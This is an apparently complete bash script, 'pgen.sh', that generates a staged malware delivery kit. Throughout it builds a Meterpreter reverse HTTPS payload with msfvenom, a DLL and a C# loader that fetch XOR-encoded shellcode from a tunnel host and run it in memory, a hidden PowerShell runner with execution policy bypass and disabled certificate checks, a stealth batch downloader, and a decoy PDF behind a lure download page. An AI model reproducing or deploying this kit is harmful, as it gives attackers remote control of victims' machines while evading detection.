#!/bin/bash
# pgen.sh - Stealth Payload Generator for Cloudflare Tunnels
# Usage: ./pgen.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-v]

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Default values
TUNNEL_HOST=""
WEB_URL=""
BASE_PATH="/generated"  # Files are in /generated folder on Vercel
PAYLOAD_PORT="443"
XOR_KEY="0x6A"
OUTPUT_DIR="./generated"
VISIBLE_MODE=0

show_banner() {
    echo -e "${BLUE}"
    echo '╔══════════════════════════════════════════════════════════════════╗'
    echo '║     🚀 STEALTH PAYLOAD GENERATOR - CLOUDFLARE EDITION            ║'
    echo '║                    TLS 1.2 Fixed Stage2 Loader                   ║'
    echo '╚══════════════════════════════════════════════════════════════════╝'
    echo -e "${NC}"
}

show_usage() {
    echo -e "${YELLOW}Usage:${NC} $0 -t <tunnel_hostname> -u <web_url> [options]"
    echo
    echo "Required:"
    echo "  -t, --tunnel HOSTNAME    Your Cloudflare tunnel hostname"
    echo "  -u, --url WEB_URL         Your web server URL (e.g., https://domenca.vercel.app)"
    echo
    echo "Options:"
    echo "  -p, --port PORT           Port for payload (default: 443)"
    echo "  -k, --key HEX_KEY         XOR key (default: 0x6A)"
    echo "  -o, --output DIR          Output directory (default: ./generated)"
    echo "  -v, --visible             Show console windows (debug mode)"
    echo "  -h, --help                Show this help"
    exit 1
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
        -u|--url) WEB_URL="$2"; shift 2 ;;
        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
        -k|--key) XOR_KEY="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -v|--visible) VISIBLE_MODE=1; shift ;;
        -h|--help) show_usage ;;
        *) echo -e "${RED}Unknown option $1${NC}"; show_usage ;;
    esac
done

if [ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ]; then
    echo -e "${RED}Error: Tunnel and URL are required${NC}"
    show_usage
fi

# Remove trailing slash from WEB_URL if present
WEB_URL="${WEB_URL%/}"
# Construct full base URL with path
FULL_BASE_URL="${WEB_URL}${BASE_PATH}"
XOR_KEY_DEC=$((XOR_KEY))

show_banner
echo -e "${GREEN}[✓] Configuration:${NC}"
echo "    Tunnel: $TUNNEL_HOST"
echo "    Web URL: $WEB_URL"
echo "    Base Path: $BASE_PATH"
echo "    Full URL: $FULL_BASE_URL"
echo "    Port:    $PAYLOAD_PORT"
echo "    XOR Key: $XOR_KEY ($XOR_KEY_DEC)"
echo "    Mode:    $([ $VISIBLE_MODE -eq 1 ] && echo "VISIBLE" || echo "STEALTH")"
echo

mkdir -p "$OUTPUT_DIR"/{payloads,tools,output}
cd "$OUTPUT_DIR" || exit 1

# ============================================
# STEP 1: Create payload generator (msfvenom IP workaround)
# ============================================
echo -e "${YELLOW}[1/6] Creating payload generator (msfvenom)...${NC}"

cat > tools/generate_payload.sh << EOF
#!/bin/bash
# Auto-generated - uses msfvenom with IP workaround

# Resolve tunnel IP
TUNNEL="$TUNNEL_HOST"
PORT="$PAYLOAD_PORT"
KEY="$XOR_KEY_DEC"

echo "[+] Resolving IP for \$TUNNEL..."
LHOST_IP=\$(dig +short \$TUNNEL | head -n1)
if [ -z "\$LHOST_IP" ]; then
    echo "[!] DNS resolution failed, using fallback IP"
    LHOST_IP="104.16.231.132"
fi

echo "[+] Generating raw shellcode with IP \$LHOST_IP..."
msfvenom -p windows/x64/meterpreter_reverse_https \\
    LHOST="\$LHOST_IP" \\
    LPORT="\$PORT" \\
    -f raw \\
    -o ../output/payload.raw

if [ -f ../output/payload.raw ]; then
    echo "[+] Payload generated successfully"
else
    echo "[✗] Payload generation failed"
    exit 1
fi
EOF

chmod +x tools/generate_payload.sh

# ============================================
# STEP 2: Create DLL template (optional)
# ============================================
echo -e "${YELLOW}[2/6] Creating DLL template...${NC}"

cat > tools/dll_template.c << EOF
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

const char* c2_host = "$TUNNEL_HOST";
int c2_port = $PAYLOAD_PORT;
const unsigned char xor_key = $XOR_KEY_DEC;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInternet) {
            HINTERNET hConnect = InternetConnectA(hInternet, c2_host, c2_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "$BASE_PATH/payload.enc", NULL, NULL, NULL, 
                                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
                if (hRequest) {
                    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                        unsigned char buffer[524288];
                        DWORD bytesRead;
                        if (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                            unsigned char* decoded = VirtualAlloc(NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                            if (decoded) {
                                for(DWORD i = 0; i < bytesRead; i++) decoded[i] = buffer[i] ^ xor_key;
                                void (*shellcode)() = (void(*)())decoded;
                                shellcode();
                            }
                        }
                    }
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }
    }
    return TRUE;
}
EOF

# ============================================
# STEP 3: Create C# Stage 2 loader with TLS 1.2 FIX and DEBUG LOGGING
# ============================================
echo -e "${YELLOW}[3/6] Creating C# Stage 2 loader with TLS 1.2 fix...${NC}"

# Install mono if needed for compilation
if ! command -v mcs &> /dev/null; then
    echo "[*] Installing mono C# compiler..."
    sudo apt update
    sudo apt install -y mono-mcs
fi

# Create C# source code for Stage 2 with TLS 1.2 fix
cat > tools/stage2.cs << 'EOF'
using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Stage2
{
    class Program
    {
        static void Log(string message)
        {
            try
            {
                string logPath = Path.GetTempPath() + "stage2_debug.txt";
                File.AppendAllText(logPath, DateTime.Now.ToString("HH:mm:ss") + " - " + message + Environment.NewLine);
            }
            catch { }
        }

        static void Main()
        {
            try
            {
                Log("==========================================");
                Log("Stage2 started at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                Log("==========================================");
                
                // CRITICAL FIX: Force TLS 1.2 and ignore certificate errors
                Log("Setting TLS 1.2 and disabling certificate validation...");
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                Log("TLS 1.2 forced and certificate validation disabled");
                
                // Get the base URL
                string baseUrl = "FULL_BASE_URL_PLACEHOLDER";
                Log("Base URL: " + baseUrl);
                
                // Download and execute stage3 PowerShell script
                string stage3Url = baseUrl + "/payloads/stage3.ps1";
                Log("Stage3 URL: " + stage3Url);
                
                // Download stage3.ps1
                Log("Creating WebClient...");
                WebClient client = new WebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                client.Headers.Add("Accept", "*/*");
                
                Log("Downloading stage3.ps1...");
                string script = client.DownloadString(stage3Url);
                Log("Downloaded " + script.Length + " bytes");
                
                // Save script to temp for debugging
                string scriptPath = Path.GetTempPath() + "stage3.ps1";
                File.WriteAllText(scriptPath, script);
                Log("Saved stage3 to: " + scriptPath);
                
                // Execute with PowerShell
                Log("Creating PowerShell process...");
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -File \"" + scriptPath + "\"";
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                
                Log("Starting PowerShell with PID...");
                Process p = new Process();
                p.StartInfo = psi;
                p.Start();
                Log("PowerShell started with PID: " + p.Id);
                
                // Also open decoy PDF
                try
                {
                    Log("Downloading decoy PDF...");
                    string decoyUrl = baseUrl + "/decoy.pdf";
                    string decoyPath = Path.GetTempPath() + "decoy.pdf";
                    client.DownloadFile(decoyUrl, decoyPath);
                    Log("Decoy PDF downloaded to: " + decoyPath);
                    
                    // Check if file exists and has size
                    FileInfo fi = new FileInfo(decoyPath);
                    if (fi.Length > 0)
                    {
                        Log("Decoy PDF size: " + fi.Length + " bytes");
                        Process.Start(decoyPath);
                        Log("Decoy PDF opened");
                    }
                    else
                    {
                        Log("Decoy PDF is empty!");
                    }
                }
                catch (Exception pdfEx)
                {
                    Log("PDF error: " + pdfEx.Message);
                }
                
                Log("==========================================");
                Log("Stage2 completed successfully at " + DateTime.Now.ToString("HH:mm:ss"));
                Log("==========================================");
            }
            catch (Exception ex)
            {
                Log("==========================================");
                Log("CRITICAL ERROR at " + DateTime.Now.ToString("HH:mm:ss"));
                Log("Error Type: " + ex.GetType().ToString());
                Log("Message: " + ex.Message);
                Log("Stack Trace: " + ex.StackTrace);
                if (ex.InnerException != null)
                {
                    Log("Inner Exception: " + ex.InnerException.Message);
                }
                Log("==========================================");
            }
        }
    }
}
EOF

# Replace placeholder in C# source
sed -i "s|FULL_BASE_URL_PLACEHOLDER|$FULL_BASE_URL|g" tools/stage2.cs

# Compile C# to EXE
echo "[*] Compiling C# Stage 2 loader..."
mcs -target:exe -out:payloads/stage2.exe tools/stage2.cs -platform:x64
chmod +x payloads/stage2.exe
echo "[✓] Stage2.exe created successfully"

# ============================================
# STEP 4: Create Stage 3 PowerShell payload
# ============================================
echo -e "${YELLOW}[4/6] Creating Stage 3 PowerShell payload...${NC}"

cat > payloads/stage3.ps1 << EOF
# Stage 3 - Final payload loader
# Download from: $FULL_BASE_URL/payload.enc

\$key = $XOR_KEY_DEC
\$baseUrl = "$FULL_BASE_URL"

# Force TLS 1.2 in PowerShell as well
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}

try {
    Write-Host "[Stage3] Starting at $(Get-Date)" -ForegroundColor Yellow
    Write-Host "[Stage3] Downloading from \$baseUrl/payload.enc..." -ForegroundColor Yellow
    
    \$wc = New-Object System.Net.WebClient
    \$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    \$enc = \$wc.DownloadData("\$baseUrl/payload.enc")
    Write-Host "[Stage3] Downloaded \$(\$enc.Length) bytes" -ForegroundColor Green
    
    Write-Host "[Stage3] XOR decrypting with key \$key..." -ForegroundColor Yellow
    \$dec = for(\$i=0; \$i -lt \$enc.Count; \$i++) { \$enc[\$i] -bxor \$key }
    
    Write-Host "[Stage3] Allocating memory..." -ForegroundColor Yellow
    \$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(\$dec.Length)
    [System.Runtime.InteropServices.Marshal]::Copy(\$dec, 0, \$ptr, \$dec.Length)
    
    Write-Host "[Stage3] Executing payload..." -ForegroundColor Yellow
    \$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(\$ptr, [Type]([Action]))
    \$delegate.Invoke()
    
    Write-Host "[Stage3] Payload executed at $(Get-Date)" -ForegroundColor Green
} catch {
    Write-Host "[Stage3] ERROR: \$(\$_.Exception.Message)" -ForegroundColor Red
    Write-Host "[Stage3] Stack: \$(\$_.ScriptStackTrace)" -ForegroundColor Red
    
    # Write to file for debugging
    \$errorPath = "\$env:TEMP\\stage3_error.txt"
    \$errorMessage = @"
Time: $(Get-Date)
Error: \$(\$_.Exception.Message)
Type: \$(\$_.Exception.GetType().Name)
Stack: \$(\$_.ScriptStackTrace)

Full Exception:
\$(\$_.Exception | Format-List * -Force | Out-String)
"@
    \$errorMessage | Out-File -FilePath \$errorPath
    Write-Host "[Stage3] Error written to: \$errorPath" -ForegroundColor Yellow
}
EOF

# ============================================
# STEP 5: Create Stage1.bat with enhanced debugging
# ============================================
echo -e "${YELLOW}[5/6] Creating Stage1.bat...${NC}"

if [ $VISIBLE_MODE -eq 1 ]; then
    # VISIBLE MODE - Shows windows
    cat > payloads/stage1.bat << EOF
@echo off
title Stage1 Payload Loader - DEBUG MODE
color 0A
echo ========================================
echo        STAGE1 PAYLOAD LOADER (DEBUG)
echo ========================================
echo.
echo [!] Configuration:
echo     URL: $FULL_BASE_URL
echo     Temp Folder: %TEMP%
echo.
echo [!] Downloading stage2.exe from:
echo     $FULL_BASE_URL/payloads/stage2.exe
echo.

:: Download stage2.exe to temp folder
echo [1/2] Downloading stage2.exe...
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/payloads/stage2.exe', '%TEMP%\stage2.exe')"
if exist %TEMP%\stage2.exe (
    echo [✓] Downloaded stage2.exe successfully
    for %%A in (%TEMP%\stage2.exe) do echo     Size: %%~zA bytes
    echo.
    echo [2/2] Executing stage2.exe...
    echo     Debug log will be at: %TEMP%\stage2_debug.txt
    echo     Stage3 log will be at: %TEMP%\stage3_error.txt
    echo.
    start /B %TEMP%\stage2.exe
    echo [✓] stage2.exe launched
    echo.
    echo [!] Waiting 3 seconds for logs to be written...
    timeout /t 3 /nobreak > nul
    echo.
    echo [Logs] Checking stage2_debug.txt:
    echo ----------------------------------------
    if exist %TEMP%\stage2_debug.txt (
        type %TEMP%\stage2_debug.txt
    ) else (
        echo [✗] stage2_debug.txt not found yet
    )
    echo ----------------------------------------
) else (
    echo [✗] Failed to download stage2.exe
)

echo.
echo ========================================
echo Stage1 completed - Check logs above
echo ========================================
echo.
pause
EOF
else
    # STEALTH MODE - Hidden windows (still logs for debugging)
    cat > payloads/stage1.bat << EOF
@echo off
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/payloads/stage2.exe', '%TEMP%\stage2.exe')"
start /B %TEMP%\stage2.exe
EOF
fi

# ============================================
# STEP 6: Create XOR encryption utility
# ============================================
echo -e "${YELLOW}[6/6] Creating XOR encryption utility...${NC}"

cat > tools/xor_encrypt.py << EOF
#!/usr/bin/env python3
import sys

def xor_encrypt(input_file, output_file, key=$XOR_KEY_DEC):
    print(f"[*] XOR encrypting with key: {key} (0x{key:02X})")
    with open(input_file, 'rb') as f:
        data = f.read()
    encrypted = bytes([b ^ key for b in data])
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    print(f"[✓] Encrypted {len(data)} bytes -> {output_file}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: xor_encrypt.py <input_file> [output_file]")
        sys.exit(1)
    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else input_file + ".enc"
    xor_encrypt(input_file, output_file)
EOF
chmod +x tools/xor_encrypt.py

# ============================================
# STEP 7: Create decoy.pdf and index.html
# ============================================
echo "This document requires a viewer update. Please wait..." > decoy.pdf

cat > index.html << EOF
<!DOCTYPE html>
<html>
<head><title>Document Portal</title></head>
<body>
    <h1>📁 Document Portal</h1>
    <p>Tunnel: $TUNNEL_HOST</p>
    <p>Server: $FULL_BASE_URL</p>
    <ul>
        <li><a href="payloads/stage1.bat">📥 Download stage1.bat</a></li>
        <li><a href="decoy.pdf">📄 View Sample</a></li>
    </ul>
    <p><small>Files are served from: $FULL_BASE_URL</small></p>
</body>
</html>
EOF

# ============================================
# STEP 8: Create master generator script
# ============================================
cat > generate_all.sh << EOF
#!/bin/bash
echo "[🚀] Generating all payloads..."
cd tools && ./generate_payload.sh && cd ..
if [ -f output/payload.raw ]; then
    python3 tools/xor_encrypt.py output/payload.raw payload.enc
    echo "[✓] Payload encrypted: payload.enc"
    echo ""
    echo "Files to upload to $FULL_BASE_URL:"
    echo "  - payload.enc  -> $FULL_BASE_URL/payload.enc"
    echo "  - decoy.pdf    -> $FULL_BASE_URL/decoy.pdf"
    echo "  - payloads/stage1.bat -> $FULL_BASE_URL/payloads/stage1.bat"
    echo "  - payloads/stage2.exe -> $FULL_BASE_URL/payloads/stage2.exe"
    echo "  - payloads/stage3.ps1 -> $FULL_BASE_URL/payloads/stage3.ps1"
    echo "  - index.html   -> $FULL_BASE_URL/index.html"
    echo ""
    echo "[ℹ] File sizes:"
    ls -la payload.enc decoy.pdf payloads/ 2>/dev/null || true
else
    echo "[✗] Payload generation failed"
fi
EOF
chmod +x generate_all.sh

# ============================================
# Final output
# ============================================
echo
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✅ GENERATION COMPLETE!${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo
echo -e "${BLUE}Files created in:${NC} $OUTPUT_DIR"
echo
echo -e "${YELLOW}Next steps:${NC}"
echo "1. cd $OUTPUT_DIR"
echo "2. ./generate_all.sh"
echo "3. Upload ALL files to: $FULL_BASE_URL"
echo "   - payload.enc"
echo "   - decoy.pdf"
echo "   - payloads/stage1.bat"
echo "   - payloads/stage2.exe"
echo "   - payloads/stage3.ps1"
echo "   - index.html"
echo
echo -e "${YELLOW}From Windows VM download:${NC}"
echo -e "${GREEN}    $FULL_BASE_URL/payloads/stage1.bat${NC}"
echo
echo -e "${YELLOW}Debugging:${NC}"
echo "After running stage1.bat on Windows VM, check:"
echo "  📋 %TEMP%\\stage2_debug.txt - Stage2 execution log"
echo "  📋 %TEMP%\\stage3_error.txt  - Stage3 error log"
echo "  📋 %TEMP%\\stage3.ps1        - Downloaded stage3 script"
echo
echo -e "${YELLOW}Debug log will show:${NC}"
echo "  - TLS 1.2 being enabled"
echo "  - Download attempts and sizes"
echo "  - PowerShell execution status"
echo "  - Any errors with full stack traces"
echo
echo -e "${GREEN}Happy hacking! 🚀${NC}"
